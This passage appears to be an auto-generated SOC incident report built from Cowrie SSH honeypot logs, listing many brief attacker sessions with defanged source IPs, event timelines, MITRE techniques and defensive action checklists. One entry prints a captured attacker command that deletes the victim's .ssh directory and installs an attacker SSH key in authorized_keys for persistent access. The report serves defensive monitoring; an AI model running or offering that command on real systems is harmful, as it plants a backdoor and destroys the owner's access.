| `2026-09-09 13:55:33` | `cowrie.command.failed` |
| `2026-09-09 13:55:33` | `cowrie.command.input` |
| `2026-09-09 13:55:33` | `cowrie.command.input` |
| `2026-09-09 13:55:33` | `cowrie.command.input` |
| `2026-09-09 13:55:34` | `cowrie.command.input` |
| `2026-09-09 13:55:34` | `cowrie.command.failed` |
| `2026-09-09 13:55:34` | `cowrie.command.input` |
| `2026-09-09 13:55:34` | `cowrie.command.failed` |
| `2026-09-09 13:55:34` | `cowrie.command.input` |
| `2026-09-09 13:55:34` | `cowrie.command.failed` |
| `2026-09-09 13:55:34` | `cowrie.command.input` |
| `2026-09-09 13:55:34` | `cowrie.command.failed` |
| `2026-09-09 13:55:34` | `cowrie.command.input` |
| `2026-09-09 13:55:34` | `cowrie.command.input` |
| `2026-09-09 13:55:34` | `cowrie.command.failed` |
| `2026-09-09 13:55:34` | `cowrie.command.input` |
| `2026-09-09 13:55:34` | `cowrie.command.input` |
| `2026-09-09 13:56:34` | `cowrie.log.closed` |
| `2026-09-09 13:56:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.225.6[.]184` to AbuseIPDB if not already reported
- [ ] Block `144.225.6[.]184` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e6db99e618b

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-09 14:06 |
| **Last Seen** | 2026-09-09 14:06 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 14:06:49` | `cowrie.session.connect` |
| `2026-09-09 14:06:49` | `cowrie.client.version` |
| `2026-09-09 14:06:50` | `cowrie.client.kex` |
| `2026-09-09 14:06:50` | `cowrie.login.success` |
| `2026-09-09 14:06:54` | `cowrie.direct-tcpip.request` |
| `2026-09-09 14:06:54` | `cowrie.direct-tcpip.ja4` |
| `2026-09-09 14:06:54` | `cowrie.direct-tcpip.data` |
| `2026-09-09 14:06:55` | `cowrie.direct-tcpip.request` |
| `2026-09-09 14:06:56` | `cowrie.direct-tcpip.ja4` |
| `2026-09-09 14:06:56` | `cowrie.direct-tcpip.data` |
| `2026-09-09 14:06:57` | `cowrie.direct-tcpip.request` |
| `2026-09-09 14:06:57` | `cowrie.direct-tcpip.ja4` |
| `2026-09-09 14:06:57` | `cowrie.direct-tcpip.data` |
| `2026-09-09 14:06:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd436a99a765

| Field | Detail |
|---|---|
| **Source IP** | `184.105.247[.]195` |
| **First Seen** | 2026-09-09 14:10 |
| **Last Seen** | 2026-09-09 14:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:110.0) Gecko/20100101 Firefox/110.0, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 14:10:26` | `cowrie.session.connect` |
| `2026-09-09 14:10:26` | `cowrie.login.success` |
| `2026-09-09 14:10:26` | `cowrie.session.params` |
| `2026-09-09 14:10:26` | `cowrie.command.input` |
| `2026-09-09 14:10:26` | `cowrie.command.input` |
| `2026-09-09 14:10:26` | `cowrie.command.failed` |
| `2026-09-09 14:10:26` | `cowrie.command.input` |
| `2026-09-09 14:10:26` | `cowrie.command.failed` |
| `2026-09-09 14:10:26` | `cowrie.command.input` |
| `2026-09-09 14:10:26` | `cowrie.log.closed` |
| `2026-09-09 14:10:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `184.105.247[.]195` to AbuseIPDB if not already reported
- [ ] Block `184.105.247[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7e4bfec7862

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]234` |
| **First Seen** | 2026-09-09 14:18 |
| **Last Seen** | 2026-09-09 14:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 14:18:59` | `cowrie.session.connect` |
| `2026-09-09 14:18:59` | `cowrie.client.version` |
| `2026-09-09 14:18:59` | `cowrie.client.kex` |
| `2026-09-09 14:19:00` | `cowrie.login.success` |
| `2026-09-09 14:19:02` | `cowrie.direct-tcpip.request` |
| `2026-09-09 14:19:02` | `cowrie.direct-tcpip.ja4` |
| `2026-09-09 14:19:02` | `cowrie.direct-tcpip.data` |
| `2026-09-09 14:19:02` | `cowrie.direct-tcpip.request` |
| `2026-09-09 14:19:02` | `cowrie.direct-tcpip.ja4` |
| `2026-09-09 14:19:02` | `cowrie.direct-tcpip.data` |
| `2026-09-09 14:19:02` | `cowrie.direct-tcpip.request` |
| `2026-09-09 14:19:02` | `cowrie.direct-tcpip.ja4` |
| `2026-09-09 14:19:02` | `cowrie.direct-tcpip.data` |
| `2026-09-09 14:19:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]234` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]234` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfda3e4222c3

| Field | Detail |
|---|---|
| **Source IP** | `64.227.36[.]5` |
| **First Seen** | 2026-09-09 14:46 |
| **Last Seen** | 2026-09-09 14:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 14:46:10` | `cowrie.session.connect` |
| `2026-09-09 14:46:10` | `cowrie.client.version` |
| `2026-09-09 14:46:11` | `cowrie.client.kex` |
| `2026-09-09 14:46:11` | `cowrie.login.success` |
| `2026-09-09 14:46:11` | `cowrie.session.params` |
| `2026-09-09 14:46:11` | `cowrie.command.input` |
| `2026-09-09 14:46:12` | `cowrie.log.closed` |
| `2026-09-09 14:46:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.227.36[.]5` to AbuseIPDB if not already reported
- [ ] Block `64.227.36[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e97a83b7d195

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-09-09 14:47 |
| **Last Seen** | 2026-09-09 14:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 14:47:08` | `cowrie.session.connect` |
| `2026-09-09 14:47:08` | `cowrie.client.version` |
| `2026-09-09 14:47:08` | `cowrie.client.kex` |
| `2026-09-09 14:47:09` | `cowrie.login.success` |
| `2026-09-09 14:47:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7e891d27b49

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-09-09 14:47 |
| **Last Seen** | 2026-09-09 14:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 14:47:08` | `cowrie.session.connect` |
| `2026-09-09 14:47:08` | `cowrie.client.version` |
| `2026-09-09 14:47:08` | `cowrie.client.kex` |
| `2026-09-09 14:47:09` | `cowrie.login.success` |
| `2026-09-09 14:47:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d382bcd8099

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-09 14:48 |
| **Last Seen** | 2026-09-09 14:48 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 14:48:04` | `cowrie.session.connect` |
| `2026-09-09 14:48:04` | `cowrie.client.version` |
| `2026-09-09 14:48:04` | `cowrie.client.kex` |
| `2026-09-09 14:48:05` | `cowrie.login.success` |
| `2026-09-09 14:48:07` | `cowrie.direct-tcpip.request` |
| `2026-09-09 14:48:07` | `cowrie.direct-tcpip.ja4` |
| `2026-09-09 14:48:07` | `cowrie.direct-tcpip.data` |
| `2026-09-09 14:48:07` | `cowrie.direct-tcpip.request` |
| `2026-09-09 14:48:08` | `cowrie.direct-tcpip.ja4` |
| `2026-09-09 14:48:08` | `cowrie.direct-tcpip.data` |
| `2026-09-09 14:48:08` | `cowrie.direct-tcpip.request` |
| `2026-09-09 14:48:09` | `cowrie.direct-tcpip.ja4` |
| `2026-09-09 14:48:09` | `cowrie.direct-tcpip.data` |
| `2026-09-09 14:48:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7647fe58933

| Field | Detail |
|---|---|
| **Source IP** | `64.227.36[.]5` |
| **First Seen** | 2026-09-09 14:48 |
| **Last Seen** | 2026-09-09 14:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 14:48:50` | `cowrie.session.connect` |
| `2026-09-09 14:48:50` | `cowrie.client.version` |
| `2026-09-09 14:48:50` | `cowrie.client.kex` |
| `2026-09-09 14:48:50` | `cowrie.login.success` |
| `2026-09-09 14:48:51` | `cowrie.session.params` |
| `2026-09-09 14:48:51` | `cowrie.command.input` |
| `2026-09-09 14:48:51` | `cowrie.log.closed` |
| `2026-09-09 14:48:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.227.36[.]5` to AbuseIPDB if not already reported
- [ ] Block `64.227.36[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-482ff4bd0add

| Field | Detail |
|---|---|
| **Source IP** | `64.227.36[.]5` |
| **First Seen** | 2026-09-09 14:51 |
| **Last Seen** | 2026-09-09 14:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 14:51:33` | `cowrie.session.connect` |
| `2026-09-09 14:51:33` | `cowrie.client.version` |
| `2026-09-09 14:51:33` | `cowrie.client.kex` |
| `2026-09-09 14:51:33` | `cowrie.login.success` |
| `2026-09-09 14:51:34` | `cowrie.session.params` |
| `2026-09-09 14:51:34` | `cowrie.command.input` |
| `2026-09-09 14:51:34` | `cowrie.log.closed` |
| `2026-09-09 14:51:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.227.36[.]5` to AbuseIPDB if not already reported
- [ ] Block `64.227.36[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d79586a9279

| Field | Detail |
|---|---|
| **Source IP** | `64.227.36[.]5` |
| **First Seen** | 2026-09-09 14:54 |
| **Last Seen** | 2026-09-09 14:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 14:54:16` | `cowrie.session.connect` |
| `2026-09-09 14:54:16` | `cowrie.client.version` |
| `2026-09-09 14:54:16` | `cowrie.client.kex` |
| `2026-09-09 14:54:16` | `cowrie.login.success` |
| `2026-09-09 14:54:17` | `cowrie.session.params` |
| `2026-09-09 14:54:17` | `cowrie.command.input` |
| `2026-09-09 14:54:17` | `cowrie.log.closed` |
| `2026-09-09 14:54:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.227.36[.]5` to AbuseIPDB if not already reported
- [ ] Block `64.227.36[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe1d23b2204b

| Field | Detail |
|---|---|
| **Source IP** | `64.227.36[.]5` |
| **First Seen** | 2026-09-09 14:56 |
| **Last Seen** | 2026-09-09 14:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 14:56:57` | `cowrie.session.connect` |
| `2026-09-09 14:56:57` | `cowrie.client.version` |
| `2026-09-09 14:56:57` | `cowrie.client.kex` |
| `2026-09-09 14:56:58` | `cowrie.login.success` |
| `2026-09-09 14:56:58` | `cowrie.session.params` |
| `2026-09-09 14:56:58` | `cowrie.command.input` |
| `2026-09-09 14:56:58` | `cowrie.log.closed` |
| `2026-09-09 14:56:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.227.36[.]5` to AbuseIPDB if not already reported
- [ ] Block `64.227.36[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-140f8030e00a

| Field | Detail |
|---|---|
| **Source IP** | `64.227.36[.]5` |
| **First Seen** | 2026-09-09 14:59 |
| **Last Seen** | 2026-09-09 14:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 14:59:33` | `cowrie.session.connect` |
| `2026-09-09 14:59:33` | `cowrie.client.version` |
| `2026-09-09 14:59:33` | `cowrie.client.kex` |
| `2026-09-09 14:59:33` | `cowrie.login.success` |
| `2026-09-09 14:59:34` | `cowrie.session.params` |
| `2026-09-09 14:59:34` | `cowrie.command.input` |
| `2026-09-09 14:59:34` | `cowrie.log.closed` |
| `2026-09-09 14:59:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.227.36[.]5` to AbuseIPDB if not already reported
- [ ] Block `64.227.36[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cbc1a97fe34

| Field | Detail |
|---|---|
| **Source IP** | `64.227.36[.]5` |
| **First Seen** | 2026-09-09 15:02 |
| **Last Seen** | 2026-09-09 15:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 15:02:13` | `cowrie.session.connect` |
| `2026-09-09 15:02:13` | `cowrie.client.version` |
| `2026-09-09 15:02:13` | `cowrie.client.kex` |
| `2026-09-09 15:02:13` | `cowrie.login.success` |
| `2026-09-09 15:02:14` | `cowrie.session.params` |
| `2026-09-09 15:02:14` | `cowrie.command.input` |
| `2026-09-09 15:02:14` | `cowrie.log.closed` |
| `2026-09-09 15:02:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.227.36[.]5` to AbuseIPDB if not already reported
- [ ] Block `64.227.36[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d67756ece17

| Field | Detail |
|---|---|
| **Source IP** | `64.227.36[.]5` |
| **First Seen** | 2026-09-09 15:05 |
| **Last Seen** | 2026-09-09 15:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 15:05:04` | `cowrie.session.connect` |
| `2026-09-09 15:05:05` | `cowrie.client.version` |
| `2026-09-09 15:05:05` | `cowrie.client.kex` |
| `2026-09-09 15:05:06` | `cowrie.login.success` |
| `2026-09-09 15:05:06` | `cowrie.session.params` |
| `2026-09-09 15:05:06` | `cowrie.command.input` |
| `2026-09-09 15:05:07` | `cowrie.log.closed` |
| `2026-09-09 15:05:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.227.36[.]5` to AbuseIPDB if not already reported
- [ ] Block `64.227.36[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3381501061e2

| Field | Detail |
|---|---|
| **Source IP** | `64.227.36[.]5` |
| **First Seen** | 2026-09-09 15:08 |
| **Last Seen** | 2026-09-09 15:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 15:08:05` | `cowrie.session.connect` |
| `2026-09-09 15:08:05` | `cowrie.client.version` |
| `2026-09-09 15:08:05` | `cowrie.client.kex` |
| `2026-09-09 15:08:05` | `cowrie.login.success` |
| `2026-09-09 15:08:06` | `cowrie.session.params` |
| `2026-09-09 15:08:06` | `cowrie.command.input` |
| `2026-09-09 15:08:06` | `cowrie.log.closed` |
| `2026-09-09 15:08:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.227.36[.]5` to AbuseIPDB if not already reported
- [ ] Block `64.227.36[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be3fc14c5339

| Field | Detail |
|---|---|
| **Source IP** | `152.32.189[.]202` |
| **First Seen** | 2026-09-09 15:08 |
| **Last Seen** | 2026-09-09 15:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `Accept: */*` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 15:08:33` | `cowrie.session.connect` |
| `2026-09-09 15:08:33` | `cowrie.login.success` |
| `2026-09-09 15:08:34` | `cowrie.session.params` |
| `2026-09-09 15:08:34` | `cowrie.command.input` |
| `2026-09-09 15:08:34` | `cowrie.command.failed` |
| `2026-09-09 15:08:34` | `cowrie.command.input` |
| `2026-09-09 15:08:34` | `cowrie.log.closed` |
| `2026-09-09 15:08:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.189[.]202` to AbuseIPDB if not already reported
- [ ] Block `152.32.189[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c42463ea3017

| Field | Detail |
|---|---|
| **Source IP** | `152.32.163[.]183` |
| **First Seen** | 2026-09-09 15:10 |
| **Last Seen** | 2026-09-09 15:11 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 15:10:53` | `cowrie.session.connect` |
| `2026-09-09 15:10:53` | `cowrie.client.version` |
| `2026-09-09 15:10:54` | `cowrie.client.kex` |
| `2026-09-09 15:10:55` | `cowrie.login.success` |
| `2026-09-09 15:10:56` | `cowrie.session.params` |
| `2026-09-09 15:10:56` | `cowrie.command.input` |
| `2026-09-09 15:10:56` | `cowrie.command.failed` |
| `2026-09-09 15:10:56` | `cowrie.log.closed` |
| `2026-09-09 15:10:57` | `cowrie.session.params` |
| `2026-09-09 15:10:57` | `cowrie.command.input` |
| `2026-09-09 15:10:58` | `cowrie.session.file_download` |
| `2026-09-09 15:10:58` | `cowrie.log.closed` |
| `2026-09-09 15:11:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.163[.]183` to AbuseIPDB if not already reported
- [ ] Block `152.32.163[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44b033b994af

| Field | Detail |
|---|---|
| **Source IP** | `152.32.163[.]183` |
| **First Seen** | 2026-09-09 15:10 |
| **Last Seen** | 2026-09-09 15:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 15:10:58` | `cowrie.session.connect` |
| `2026-09-09 15:10:58` | `cowrie.client.version` |
| `2026-09-09 15:10:58` | `cowrie.client.kex` |
| `2026-09-09 15:10:59` | `cowrie.login.success` |
| `2026-09-09 15:11:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.163[.]183` to AbuseIPDB if not already reported
- [ ] Block `152.32.163[.]183` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a762f50ad0c

| Field | Detail |
|---|---|
| **Source IP** | `152.32.163[.]183` |
| **First Seen** | 2026-09-09 15:11 |
| **Last Seen** | 2026-09-09 15:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 15:11:00` | `cowrie.session.connect` |
| `2026-09-09 15:11:00` | `cowrie.client.version` |
| `2026-09-09 15:11:00` | `cowrie.client.kex` |
| `2026-09-09 15:11:01` | `cowrie.login.success` |
| `2026-09-09 15:11:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.163[.]183` to AbuseIPDB if not already reported
- [ ] Block `152.32.163[.]183` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c5673bb9b86

| Field | Detail |
|---|---|
| **Source IP** | `64.227.36[.]5` |
| **First Seen** | 2026-09-09 15:11 |
| **Last Seen** | 2026-09-09 15:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 15:11:03` | `cowrie.session.connect` |
| `2026-09-09 15:11:03` | `cowrie.client.version` |
| `2026-09-09 15:11:03` | `cowrie.client.kex` |
| `2026-09-09 15:11:04` | `cowrie.login.success` |
| `2026-09-09 15:11:05` | `cowrie.session.params` |
| `2026-09-09 15:11:05` | `cowrie.command.input` |
| `2026-09-09 15:11:05` | `cowrie.log.closed` |
| `2026-09-09 15:11:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.227.36[.]5` to AbuseIPDB if not already reported
- [ ] Block `64.227.36[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5adcb789fe0f

| Field | Detail |
|---|---|
| **Source IP** | `64.227.36[.]5` |
| **First Seen** | 2026-09-09 15:14 |
| **Last Seen** | 2026-09-09 15:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 15:14:03` | `cowrie.session.connect` |
| `2026-09-09 15:14:03` | `cowrie.client.version` |
| `2026-09-09 15:14:03` | `cowrie.client.kex` |
| `2026-09-09 15:14:04` | `cowrie.login.success` |
| `2026-09-09 15:14:05` | `cowrie.session.params` |
| `2026-09-09 15:14:05` | `cowrie.command.input` |
| `2026-09-09 15:14:05` | `cowrie.log.closed` |
| `2026-09-09 15:14:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.227.36[.]5` to AbuseIPDB if not already reported
- [ ] Block `64.227.36[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af5b562041ce

| Field | Detail |
|---|---|
| **Source IP** | `64.227.36[.]5` |
| **First Seen** | 2026-09-09 15:16 |
| **Last Seen** | 2026-09-09 15:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 15:16:58` | `cowrie.session.connect` |
| `2026-09-09 15:16:58` | `cowrie.client.version` |
| `2026-09-09 15:16:58` | `cowrie.client.kex` |
| `2026-09-09 15:16:58` | `cowrie.login.success` |
| `2026-09-09 15:16:59` | `cowrie.session.params` |
| `2026-09-09 15:16:59` | `cowrie.command.input` |
| `2026-09-09 15:16:59` | `cowrie.log.closed` |
| `2026-09-09 15:16:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.227.36[.]5` to AbuseIPDB if not already reported
- [ ] Block `64.227.36[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ddc8921fbd7

| Field | Detail |
|---|---|
| **Source IP** | `64.227.36[.]5` |
| **First Seen** | 2026-09-09 15:19 |
| **Last Seen** | 2026-09-09 15:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 15:19:49` | `cowrie.session.connect` |
